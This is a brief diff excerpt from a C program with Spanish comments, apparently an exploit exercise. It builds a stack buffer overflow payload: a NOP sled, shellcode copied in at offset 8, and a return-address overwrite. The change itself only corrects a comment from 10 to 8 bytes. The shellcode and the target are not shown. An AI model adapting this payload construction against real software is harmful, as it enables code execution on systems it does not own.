@@ -20,7 +20,7 @@ int main() {
     // Inicializar el payload con NOPs
     memset(payload, '\x90', 80);
 
-    // Copiar el shellcode después de 10 bytes de NOPs
+    // Copiar el shellcode después de 8 bytes de NOPs
     memcpy(payload + 8, shellcode, strlen(shellcode));
 
     // Sobrescribir la dirección de retorno (little-endian)
